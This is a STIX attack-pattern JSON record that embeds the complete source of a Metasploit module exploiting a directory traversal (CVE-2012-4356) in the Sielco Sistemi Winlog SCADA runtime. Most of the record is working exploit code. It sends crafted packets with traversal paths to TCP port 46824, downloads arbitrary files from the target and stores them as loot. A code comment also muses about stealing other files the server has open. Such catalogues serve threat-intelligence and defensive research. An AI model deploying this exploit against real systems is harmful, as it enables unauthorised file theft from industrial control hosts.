{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dcfbcf6e-511a-4360-8681-42f9e6deb4a7",
    "created": "2024-08-14T16:26:50.969688Z",
    "modified": "2024-08-14T16:26:50.969692Z",
    "name": "Sielco Sistemi Winlog Remote File Access",
    "description": " This module exploits a directory traversal in Sielco Sistemi Winlog. The vulnerability exists in the Runtime.exe service and can be triggered by sending a specially crafted packet to the 46824/TCP port. This module has been successfully tested on Sielco Sistemi Winlog Lite 2.07.14.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/scada/sielco_winlog_fileaccess.rb",
            "external_id": "sielco_winlog_fileaccess.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4356"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/winlog_2-adv.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sielco Sistemi Winlog Remote File Access',\n      'Description'    => %q{\n          This module exploits a directory traversal in Sielco Sistemi Winlog. The vulnerability\n        exists in the Runtime.exe service and can be triggered by sending a specially crafted packet\n        to the 46824/TCP port. This module has been successfully tested on Sielco Sistemi Winlog Lite\n        2.07.14.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma', # Vulnerability Discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-4356' ],\n          [ 'OSVDB', '83275' ],\n          [ 'BID', '54212' ],\n          [ 'EDB', '19409'],\n          [ 'URL', 'http://aluigi.altervista.org/adv/winlog_2-adv.txt' ]\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(46824),\n        OptString.new('FILEPATH', [true, 'The name of the file to download', '/WINDOWS/system32/drivers/etc/hosts']),\n        OptInt.new('DEPTH', [true, 'Traversal depth', 10])\n      ])\n  end\n\n  def run_host(ip)\n    # No point to continue if no filename is specified\n    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?\n      print_error(\"#{ip}:#{rport} - Please supply the name of the file you want to download\")\n      return\n    end\n\n    travs = \"../\" * datastore['DEPTH']\n    if datastore['FILEPATH'][0] == \"/\"\n      travs << datastore['FILEPATH'][1, datastore['FILEPATH'].length]\n    else\n      travs << datastore['FILEPATH']\n    end\n\n    connect\n\n    # Open File through _TCPIPS_BinOpenFileFP\n    packet = \"\\x00\" * 20\n    packet << \"\\x78\" # Opcode\n    packet << travs # Path traversal\n    packet << \"\\x00\"\n    sock.put(packet)\n    response = sock.get_once(5, 1) || ''\n\n    if response.unpack(\"C\").first != 0x78\n      print_error \"#{ip}:#{rport} - Error opening file\"\n      return\n    end\n    # The stream allows to identify our file since the\n    # server could be handling multiple files simultaneously.\n    # Since the stream identifier is just an offset in an array\n    # of opened streams it could be used to guess other files\n    # opened by the server and stole them :-) just an idea....\n    stream = response[1, 4]\n\n    # Get File Length through _TCPIPS_BinGetFileSizeFP\n    packet = \"\\x00\" * 20\n    packet << \"\\x79\" # Opcode\n    packet << stream # stream\n    packet << \"\\x00\" * 7\n    sock.put(packet)\n    response = sock.get_once(5, 1) || ''\n\n    if response.unpack(\"C\").first != 0x79\n      print_error \"#{ip}:#{rport} - Error getting the file length\"\n      return\n    end\n    file_length = response[1,4].unpack(\"V\").first\n\n\n    # Read File with the help of _TCPIPS_BinGetStringRecordFP\n    contents = \"\"\n    offset = 0\n    while contents.length < file_length\n      packet = \"\\x00\" * 20\n      packet << \"\\x98\" # Opcode\n      packet << [offset].pack(\"V\") # offset (blocks of 0x55)\n      packet << stream # stream\n      packet << \"\\x00\" * 3\n      sock.put(packet)\n      response = \"\"\n\n      while response.length < 0x7ac # Packets of 0x7ac (header (0x9) + block of data (0x7a3))\n        response << sock.get_once(0x7ac-response.length, 5) || ''\n      end\n      if response.unpack(\"C\").first != 0x98\n        print_error \"#{ip}:#{rport} - Error reading the file, anyway we're going to try to finish\"\n      end\n\n      if (file_length - contents.length) < response.length - 9\n        contents << response[9, file_length - contents.length] # last packet\n      else\n        contents << response[9, response.length] # no last packet\n      end\n\n      offset = offset + 0x17 # 17 blocks in every packet\n    end\n\n    # Close File through _TCPIPS_BinCloseFileFP\n    packet = \"\\x00\" * 20\n    packet << \"\\x7B\"\n    packet << \"\\x00\" * 11\n    sock.put(packet)\n    response = sock.get_once(-1, 1) || ''\n    if response.unpack(\"C\").first != 0x7B\n      print_error \"#{ip}:#{rport} - Error closing file file, anyway we're going to try to finish\"\n    end\n\n    disconnect\n\n    print_good \"#{ip}:#{rport} - File retrieved successfully!\"\n\n    fname = File.basename(datastore['FILEPATH'])\n    path = store_loot(\n      'sielcosistemi.winlog',\n      'application/octet-stream',\n      ip,\n      contents,\n      fname,\n      datastore['FILEPATH']\n    )\n    print_status(\"#{ip}:#{rport} - File saved in: #{path}\")\n\n  end\nend\n"
}